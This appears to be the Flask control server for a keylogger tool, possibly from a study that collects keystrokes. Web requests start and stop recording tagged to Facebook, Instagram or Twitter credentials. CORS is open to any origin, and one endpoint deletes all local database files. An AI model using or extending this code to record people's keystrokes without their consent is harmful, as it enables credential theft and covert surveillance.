import os
import glob
import multiprocessing
import sqlite3
import sys
from flask import Flask, jsonify, request
from flask_cors import CORS
from tools.keylogger import Keylogger
from base.displayer import CredentialType
from base.log import Logger

# Global dictionary to track the Keylogger process
keylogger_process = {}


def build_user_id_cache_table(user_id: str):
    conn = sqlite3.connect("user_id_cache.db")
    cursor = conn.cursor()
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS user (
        id INTEGER PRIMARY KEY,
        keylogger_id TEXT UNIQUE
    );
""")
    # Check if there's already a row in the table
    cursor.execute("SELECT COUNT(*) FROM user")
    row_count = cursor.fetchone()[0]

    if row_count == 0:
        # Insert a new row if the table is empty
        cursor.execute(
            """
        INSERT INTO user (keylogger_id) 
        VALUES (?);
        """,
            (user_id,),
        )
        conn.commit()
        print("Inserted new row.")
    else:
        print("Table already has a row. No insertion.")

    conn.close()


def get_user_id_from_cache():
    conn = sqlite3.connect("user_id_cache.db")
    cursor = conn.cursor()
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS user (
        id INTEGER PRIMARY KEY,
        keylogger_id TEXT UNIQUE
    );
""")

    cursor.execute("SELECT * FROM user")
    row = cursor.fetchone()  # Since there's only one row, we can use fetchone()

    if row:
        print(row)
    else:
        raise ValueError("user ID cache is empty!")
    conn.close()
    return str(row[1])


def execute_keylogger(platform_id: str, user_id: str):
    """Start recording keystrokes for the given platform in a separate process."""
    print("ID passed to the keylogger" + user_id)
    keylogger_instance = Keylogger(user_id)
    account_number = 1
    if platform_id == "0":
        keylogger_instance.start_recording(
            CredentialType.FACEBOOK, int(account_number), running_through_flask=True
        )
    elif platform_id == "1":
        keylogger_instance.start_recording(
            CredentialType.INSTAGRAM, int(account_number), running_through_flask=True
        )
    elif platform_id == "2":
        keylogger_instance.start_recording(
            CredentialType.TWITTER, int(account_number), running_through_flask=True
        )


# TODO: Another approach that might work is if the js stores the id in a cookie and sends it when hitting 
#       the start-server endpoint, that way the flask server can just grab it from the response data
app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}}, allow_headers=["Content-Type"])


# Handle CORS preflight OPTIONS requests
@app.before_request
def handle_preflight():
    if request.method == "OPTIONS":
        response = jsonify({"message": "CORS preflight passed"})
        response.headers.add("Access-Control-Allow-Origin", "*")
        response.headers.add("Access-Control-Allow-Methods", "POST, OPTIONS")
        response.headers.add("Access-Control-Allow-Headers", "Content-Type")
        return response


@app.route("/set-id", methods=["POST"])
def set_cookie():
    data = request.get_json()
    user_id = str(data.get("user_id"))
    log = Logger()
    if user_id is None:
        log.km_error("No USER_ID cookie set")
        sys.exit(1)
    log.km_info(f"Loaded user id is: {user_id}")
    build_user_id_cache_table(user_id)
    return jsonify({"message": "Keylogger user_id set"}), 200


@app.route("/start-server", methods=["POST"])
def start_server():
    """Start the keylogger in a separate process and store its reference."""
    print("Received start recording request from page")

    data = request.get_json()
    platform_id = str(data.get("platform_id"))
    print("Platform ID in request is:", platform_id)

    # Check if a keylogger process is already running, stop it first
    if "keylogger" in keylogger_process and keylogger_process["keylogger"].is_alive():
        print("Stopping previous keylogger process before starting a new one")
        keylogger_process["keylogger"].terminate()
        keylogger_process[
            "keylogger"
        ].join()  # Ensure the process has completely stopped
    # Grab the uer_id from the sqlite cache which should be set on page load (so it should be there when this endpoint is hit)
    user_id = get_user_id_from_cache()
    # Start a new keylogger process
    p1 = multiprocessing.Process(
        target=execute_keylogger,
        args=(
            platform_id,
            user_id,
        ),
    )
    p1.start()

    keylogger_process["keylogger"] = p1  # Store process reference

    print("Started keylogger with PID:", p1.pid)
    return jsonify({"message": "Keylogger started"}), 200


@app.route("/end-server", methods=["POST"])
def end_server():
    """Terminate only the keylogger process without stopping the Flask server."""
    if "keylogger" in keylogger_process and keylogger_process["keylogger"].is_alive():
        print(
            "Terminating keylogger process with PID:",
            keylogger_process["keylogger"].pid,
        )
        keylogger_process["keylogger"].terminate()
        keylogger_process["keylogger"].join()
        del keylogger_process["keylogger"]  # Remove the process reference

        return jsonify({"message": "Keylogger process terminated"}), 200
    else:
        return jsonify({"message": "No keylogger process found"}), 400


@app.route("/end-collection", methods=["GET"])
def on_completion():
    db_files = glob.glob(os.path.join(os.getcwd(), "*.db"))
    for db_file in db_files:
        try:
            os.remove(db_file)
            print(f"Deleted: {db_file}")
        except Exception as e:
            print(f"Error deleting {db_file}: {e}")
            response = {"message": "Failed to delete db!", "status": "fail"}
            return jsonify(response)

    response = {"message": "Deleted db file!", "status": "success"}
    return jsonify(response)


if __name__ == "__main__":
    app.run(debug=True)
